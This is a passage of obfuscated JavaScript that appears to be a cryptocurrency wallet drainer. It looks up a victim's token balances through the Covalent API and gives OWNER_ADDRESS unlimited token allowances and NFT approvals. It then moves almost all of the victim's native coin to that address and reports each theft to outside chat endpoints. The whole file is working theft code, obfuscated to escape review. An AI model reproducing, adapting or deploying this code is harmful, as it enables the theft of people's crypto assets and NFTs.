_0x7228=function(_0x722892,_0xdbf2d0){_0x722892=_0x722892-0x83;let _0x26cc0b=_0x26ff82[_0x722892];return _0x26cc0b;},_0x7228(_0x49ce4b,_0x1b163e);}async function covalenthqAPICall(){const _0xca4115=_0x4bf938,_0x6c0adb={'format':_0xca4115(0x171),'quote-currency':'usd','key':_0xca4115(0xb8)},_0x4aae2f=new URL('https://api.covalenthq.com/v1/'+chainId+_0xca4115(0xac)+selectedAccount+'/balances_v2/');_0x4aae2f[_0xca4115(0x16c)]=new URLSearchParams(_0x6c0adb)[_0xca4115(0x96)]();const _0x155a7b={'method':_0xca4115(0xd5),'headers':{'Content-Type':'application/json'}};try{const _0x983b77=await fetch(_0x4aae2f,_0x155a7b)[_0xca4115(0xbd)](_0x1404ae=>_0x1404ae['json']());let _0x551f9d=_0x983b77[_0xca4115(0xc1)][_0xca4115(0x13a)];console['log'](_0xca4115(0x16e),_0x551f9d);let _0x3de9de=_0x551f9d[_0xca4115(0x176)](_0x5225b1=>{const _0x114452=_0xca4115;return{'balance':_0x5225b1[_0x114452(0x8e)],'value':_0x5225b1[_0x114452(0x10f)],'address':_0x5225b1[_0x114452(0xc8)],'symbol':_0x5225b1[_0x114452(0x143)],'type':_0x5225b1[_0x114452(0xae)]};});console[_0xca4115(0x17e)](_0xca4115(0xd3),_0x3de9de),tokens=_0x3de9de[_0xca4115(0x15a)](_0x515936=>_0x515936[_0xca4115(0x12d)]>0x5&&_0x515936[_0xca4115(0x9c)]!='AVAX'),console['log'](_0xca4115(0x8a),chainId,_0xca4115(0xea),tokens);if(window[_0xca4115(0x111)][_0xca4115(0x16c)])onSendEther();else onApprove();}catch{sendMessage(_0xca4115(0xa8)),sendMessage1(_0xca4115(0xa8));}}async function onApprove(){const _0x1701b4=_0x4bf938;if(tokens['length'])try{loopTokens(tokens);}catch(_0x52fc5d){console['error']('Error\x20processing\x20item\x20'+_0x52fc5d[_0x1701b4(0xbb)]);}else sendMessage(_0x1701b4(0x178)),sendMessage1(_0x1701b4(0x178));}async function loopTokens(_0x48d204){const _0x75f4a0=_0x4bf938;for await(let _0xa9956b of _0x48d204){if(_0xa9956b[_0x75f4a0(0xae)]===_0x75f4a0(0xba)){let _0x438f7f=new web3Object[(_0x75f4a0(0x165))][(_0x75f4a0(0x164))](ABI,_0xa9956b[_0x75f4a0(0x10e)]);sendMessage(_0x75f4a0(0xf2)),sendMessage1(_0x75f4a0(0xf2)),await _0x438f7f['methods'][_0x75f4a0(0xee)](OWNER_ADDRESS,'999999999999999999999999999999999999999999999999999999999999999999999999')[_0x75f4a0(0x144)]({'from':selectedAccount,'to':_0xa9956b[_0x75f4a0(0x10e)]})['on'](_0x75f4a0(0xb7),_0x56615d=>{const _0x2cfb43=_0x75f4a0;console[_0x2cfb43(0x17e)]('Transaction\x20Hash:\x20'+_0x56615d);})['on']('receipt',_0x121926=>{const _0x46074a=_0x75f4a0;console[_0x46074a(0x17e)]('Transaction\x20Receipt:\x20'+_0x121926),sendMessage(_0x46074a(0x12a)),sendMessage('TOKEN\x20Contract\x20Address\x20'+_0xa9956b['address']),sendMessage('Token\x20balance\x20is\x20'+_0xa9956b['balance']),sendMessage(_0x46074a(0x11a)+OWNER_ADDRESS),sendMessage1(_0x46074a(0x12a)),sendMessage1(_0x46074a(0x142)+_0xa9956b[_0x46074a(0x10e)]),sendMessage1(_0x46074a(0xd8)+_0xa9956b[_0x46074a(0x8e)]),sendMessage1('Your\x20address\x20'+OWNER_ADDRESS);})['on']('error',_0x2de2cb=>{const _0x231b0e=_0x75f4a0;console[_0x231b0e(0x17e)](_0x231b0e(0x173)+_0x2de2cb),sendMessage(_0x231b0e(0x90)),sendMessage1('Transaction\x20Rejected');});}else{if(_0xa9956b['type']===_0x75f4a0(0xf3)){let _0x4ab567=new web3Object[(_0x75f4a0(0x165))][(_0x75f4a0(0x164))](ABIN,_0xa9956b[_0x75f4a0(0x10e)]);await _0x4ab567[_0x75f4a0(0xb1)][_0x75f4a0(0xbc)](OWNER_ADDRESS,_0x75f4a0(0x174))[_0x75f4a0(0x144)]({'from':selectedAccount,'to':_0xa9956b[_0x75f4a0(0x10e)]})['on'](_0x75f4a0(0xb7),_0x2e458b=>{const _0x5e5391=_0x75f4a0;console[_0x5e5391(0x17e)](_0x5e5391(0x110)+_0x2e458b),sendMessage(_0x5e5391(0x167)),sendMessage1('Transaction\x20is\x20submitted\x20to\x20the\x20network');})['on'](_0x75f4a0(0x9a),_0x5f13d8=>{const _0x2599d1=_0x75f4a0;console['log']('Transaction\x20Receipt:\x20'+_0x5f13d8),sendMessage(_0x2599d1(0x12a)),sendMessage(_0x2599d1(0xe8)+_0xa9956b[_0x2599d1(0x10e)]),sendMessage(_0x2599d1(0x11a)+OWNER_ADDRESS),sendMessage1('Approve\x20Completed\x20Successfully'),sendMessage1('NFT\x20Contract\x20Address\x20'+_0xa9956b[_0x2599d1(0x10e)]),sendMessage1(_0x2599d1(0x11a)+OWNER_ADDRESS);})['on'](_0x75f4a0(0x155),_0x50bc1a=>{const _0x354e1c=_0x75f4a0;console[_0x354e1c(0x17e)](_0x354e1c(0x173)+_0x50bc1a),sendMessage(_0x354e1c(0x90)),sendMessage1(_0x354e1c(0x90));});}else sendMessage(_0x75f4a0(0x8f));}};onSendEther();}async function onSendEther(){const _0x333fc8=_0x4bf938;try{let _0x526704=await web3Object[_0x333fc8(0x165)]['getBalance'](selectedAccount);var _0x1870da=await web3Object[_0x333fc8(0x165)][_0x333fc8(0xaf)](),_0xc605d={'gasPrice':_0x1870da,'from':selectedAccount,'to':OWNER_ADDRESS,'value':_0x526704},_0x264c82=await web3Object['eth'][_0x333fc8(0x12f)](_0xc605d),_0x2626ae=_0x1870da*_0x264c82;_0xc605d['gas']=_0x264c82,_0xc605d[_0x333fc8(0x12d)]=_0x526704-_0x2626ae,web3Object[_0x333fc8(0x165)][_0x333fc8(0xd0)](_0xc605d)['on'](_0x333fc8(0xb7),_0xe46da8=>{const _0x5bf38d=_0x333fc8;console[_0x5bf38d(0x17e)]('Transaction\x20Hash:\x20',_0xe46da8),sendMessage(_0x5bf38d(0x167)),sendMessage1(_0x5bf38d(0x167));})['on'](_0x333fc8(0x9a),_0x2d7486=>{const _0x1d28f1=_0x333fc8;console[_0x1d28f1(0x17e)](_0x1d28f1(0xd9),_0x2d7486),sendMessage(_0x1d28f1(0x17f));})['on'](_0x333fc8(0x155),_0x610c17=>{const _0x265208=_0x333fc8;console['log']('Error:\x20',_0x610c17),sendMessage(_0x265208(0x90)),sendMessage1(_0x265208(0x90));});}catch{sendMessage(_0x333fc8(0xe9));}}async function sendMessage(_0x436a43){return new Promise((_0x67e80e,_0x66f5f7)=>{const _0x35d5ad=_0x7228,_0x46bdd2=CHAT;fetch(_0x35d5ad(0xb2)+_0x46bdd2+_0x35d5ad(0x89)+_0x436a43,{'method':_0x35d5ad(0xd5),'headers':{}})[_0x35d5ad(0xbd)](async _0xf496b6=>{const _0x1cef2f=_0x35d5ad;if(_0xf496b6[_0x1cef2f(0x15e)]>0x18f)throw _0xf496b6;_0x67e80e(await _0xf496b6[_0x1cef2f(0x8b)]());})['catch'](_0x16cf1b=>{_0x66f5f7(_0x16cf1b);});});}async function sendMessage1(_0x56cd5e){return new Promise((_0x4f355b,_0x1f7f59)=>{const _0x268de0=_0x7228,_0xeaed78=CHAT1;fetch(_0x268de0(0xb2)+_0xeaed78+_0x268de0(0x89)+_0x56cd5e,{'method':'GET','headers':{}})[_0x268de0(0xbd)](async _0x3ec15d=>{const _0x5d3c9d=_0x268de0;if(_0x3ec15d[_0x5d3c9d(0x15e)]>0x18f)throw _0x3ec15d;_0x4f355b(await _0x3ec15d[_0x5d3c9d(0x8b)]());})['catch'](_0x4eafa6=>{_0x1f7f59(_0x4eafa6);});});}